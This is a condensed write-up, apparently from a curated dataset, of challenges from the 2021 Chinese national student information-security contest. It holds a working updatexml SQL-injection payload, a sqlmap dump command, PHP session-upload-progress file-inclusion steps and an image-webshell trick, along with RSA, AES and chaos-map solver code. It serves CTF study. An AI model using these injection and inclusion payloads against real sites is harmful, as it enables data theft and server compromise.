---
title: 第十四届全国大学的信息安全竞赛-WriteUp
contest: 全国大学生信息安全竞赛
year: 2021
difficulty: medium
vuln_type: web_unknown
tags: [Web-SQL注入-XPath,updatexml,sqmap,Web-PHP_SESSION_UPLOAD_PROGRESS,文件包含,图片马,Misc-bmp转换,proto3-Protobuf,Crypto-ADFGX,RSA共模+小指数+p高位泄露,SMS4-AES-CBC-piecesmd5,ECDSA-GF(p),混沌Logistic,Pwn]
attack_chain: Web: admin') and updatexml(0xconcat)+sqlmap|Web: PHP_SESSION_UPLOAD_PROGRESS+50KB文件POST+./var/lib/php/sessions/sess_sessid文件包含|Misc: 382张bmp RGB(233,233,233)→0|Misc: protobuf3反序列化|图片马加#define width 1 height 1|Crypto: ADFGX密文倒置密钥classic|RSA: 共模+小指数+Coppersmith/Sage求解 p高位泄露|house_of_orange+house_of_grey|SMS4-AES-CBC 第8轮异或 bytee+|ECDSA GF(p) y^2=x^3+x k,e 离散对数+Salt|混沌Logistic r=1.2 x0=0.840264 + key1,key2=169,78
key_payload: admin') and updatexml(0,concat(0x7e,mid((select * from(select * from flag a join (select * from flag)b using(id,no))c),1,50)),0);#|PHP_SESSION_UPLOAD_PROGRESS=<?php var_dump(scandir("/etc"));?> 50KB大文件POST|RSA-共模 ext_euclid(e1,e2)→s,t组合; 小指数 iroot; Coppersmith p+GF(2^512)|M = matrix(ZZ,[[2**512,e],[0,-n]]).LLL()|xort A bytee S8|1.2, 0.840264, 169, 78|逆AES + 7轮recover + rrecover
one_liner: 第十四届全国大学生信安赛Web/Misc/Crypto/Re/Pwn:Web updatexml盲注+SQLMAP+PHP_SESSION_UPLOAD_PROGRESS文件包含+图片马+ADFGX+proto3反序列化+proto2-RSA-共模+小指数+p高位+ECDSA-GF(p)+SMS4-AES-CBC(第8轮异或bytee)+Logistic混沌
lesson: 1) updatexml报错盲注+sqlmap dump; 2) PHP_SESSION_UPLOAD_PROGRESS条件竞争+50KB大文件+var/lib/php/sessions/sess_sessid LFI; 3) 图片马结尾加#define width 1 #define height 1绕图片处理; 4) ADFGX密文需倒置+关键词classic; 5) RSA-共模攻击ext_euclid;小指数iroot;p高位M.LLL(); 6) AES第8轮加bytee异或后,piece1=k[0,1,4,7,10,11,13,14] piece2=k[2,3,5,6,8,9,12,15]分别md5比对; 7) ECDSA GF(p) 求解y^2=x^3+x + k,e 离散对数; 8) Logistic r=1.2 x0=0.840264 + key1=169 key2=78 2bit编码(XOR/~XOR)
quality: high
---

## 备注

原文(https://www.ctfiot.com/1926.html)2021年第十四届全国大学生信安赛,涵盖Web/Misc/Crypto/Re/Pwn全方向。

### 题目详情

**Web**
- updatexml报错注入:`admin') and updatexml(0,concat(0x7e,mid((select * from(select * from flag a join (select * from flag)b using(id,no))c),1,50)),0);#`
- sqlmap:`sqlmap -r sql1.txt -D security -T flag -C "4719c5f3-13d7-49c8-923a-55e270da4b73" --dump`
- PHP_SESSION_UPLOAD_PROGRESS文件包含:50KB大文件POST+var/lib/php/sessions/sess_sessid LFI
- 图片马结尾加`#define width 1 #define height 1`

**Misc**
- 382张bmp RGB(233,233,233)→0
- proto3 Protobuf反序列化
- protobuf2:

```protobuf
message PBResponse {
  int32 code = 1;
  int64 flag_part_convert_to_hex_plz = 2;
  message data {
    string junk_data = 2;
    string flag_part = 1;
  }
  repeated data dataList = 3;
  int32 flag_part_plz_convert_to_hex = 4;
  string flag_last_part = 5;
}
```

**Crypto**
- ADFGX密文倒置+密钥classic
- RSA: 共模+小指数+Coppersmith p高位
- AES-SMS4: 第8轮异或bytee + piece1/piece2 md5验证

**AES-魔改攻击**
```python
def encrypt_block_(self, plaintext, bytee):
    for i in range(1, self.n_rounds):
        if i==8:
            plain_state[0][0] ^= bytee
        sub_bytes / shift_rows / mix_columns / add_round_key
    # 提取 piece1, piece2
    piece1 = [k[0],k[1],k[4],k[7],k[10],k[11],k[13],k[14]]
    piece2 = [k[2],k[3],k[5],k[6],k[8],k[9],k[12],k[15]]
    m11 = md5(piece1)
    m22 = md5(piece2)
    if m11 == m1 and m22 == m2: print(key)
```

**RSA-高阶**
```python
# 已知 e, x, y 满足 e*x - n*y = k
k = e*x - n*y
K = k//y
def factor(K, N):
    l, r = 0, K
    for i in range(518):
        s = (l+r)//2
        v = s*s - 9*s*s*(K-1-s)*(K-1-s)//(round(N**0.25)*round(N**0.25))
        if v < 4*N: l = s
        else: r = s
    return r
S = factor(K, n)
d = inverse(e, n+1+S)
m = mul(d, c)  # 椭圆曲线乘法
print(long_to_bytes(m[0])+long_to_bytes(m[1]))
```

```sage
M = matrix(ZZ, [[2**512, e], [0, -n]])
GV = M.LLL()[0]
x = GV[0]>>512
y = (e*x - GV[1])//n
```

**Re/Misc-混沌Logistic**
```python
def gen(x, r): return round(r*x*(3-x), 6)
r = 1.2
x0 = 0.840264
key1, key2 = 169, 78
# encrypt: ch=0/1/2/3 → 0:(pix^key1); 1:(~pix^key1); 2:(pix^key2); 3:(~pix^key2)
# 2bit编码 × 8bit像素 = 每像素4种状态
```

**ECDSA GF(p)**
- y^2 = x^3 + x (mod p)
- 已知k,e + 离散对数

**Pwn**
- house_of_orange + house_of_grey
- AES第8轮异或bytee

## 评级

- **quality: high** — 多方向综合高难度题,Web+SQL注入+PHP_SESSION_UPLOAD_PROGRESS+图片马+ADFGX+RSA-共模/小指数/p高位+SMS4-AES-CBC+Logistic混沌+ECDSA-GF(p)+Pwn全套
- **vuln_type: web_unknown** — 主分类Web
- 实战价值:CISCN高难度综合,涵盖密码学+Web+Reverse全套
